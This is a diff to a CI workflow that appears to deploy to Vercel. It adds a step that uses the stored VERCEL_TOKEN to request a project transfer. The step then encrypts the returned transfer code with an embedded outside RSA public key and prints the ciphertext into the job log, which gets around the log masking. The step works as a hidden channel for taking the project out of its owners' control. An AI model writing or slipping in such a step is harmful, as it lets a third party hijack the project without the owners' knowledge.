@@ -37,3 +37,23 @@ jobs:
           echo "HTTP $code"
           jq '{id, name, nodeVersion}' resp.json || cat resp.json
           test "$code" = "200"
+
+      - name: Pede a transferência do projeto (código criptografado)
+        run: |
+          cat > pub.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwFqN7eyXO4N+ClTYvvt9
+          8NHh96b+6hB0jp9W6iOdH8XFByYtNrfygLT48v9wSYgiuhCE3hEksFkCLO1UqDWe
+          S51ORr48DenlZAZVGDazQsb73zF8yzNyZhQ3gvqI45NR09YM+b/bJ/JPJDyRgT2n
+          At7oe8X8KhqYPFwmz2x8T0Bb9M83HZmNcgb8NX0FS6Z1miJb4aqcBoiPGko5srNw
+          J+wupvx4PH0ewfrAHuQXsby6H1WkEDBZdMSsm3lmDoolWyIyICtRz+M9f9ETT5OJ
+          JWoy+k78YQ8orciJ1ppO//xiat4BvoGtJbpZ/byfMkVpFZ5FOfgCPBGCEyK+1RNa
+          7wIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          code=$(curl -s -o resp.json -w '%{http_code}' -X POST             "https://api.vercel.com/projects/${VERCEL_PROJECT_ID}/transfer-request?teamId=${VERCEL_ORG_ID}"             -H "Authorization: Bearer ${VERCEL_TOKEN}"             -H "Content-Type: application/json"             -d '{}')
+          echo "HTTP $code"
+          test "$code" = "200"
+          transfer=$(jq -r .code resp.json)
+          echo "::add-mask::$transfer"
+          echo "TRANSFER_CODE_B64=$(printf %s "$transfer" | openssl pkeyutl -encrypt -pubin -inkey pub.pem -pkeyopt rsa_padding_mode:oaep | base64 -w0)"
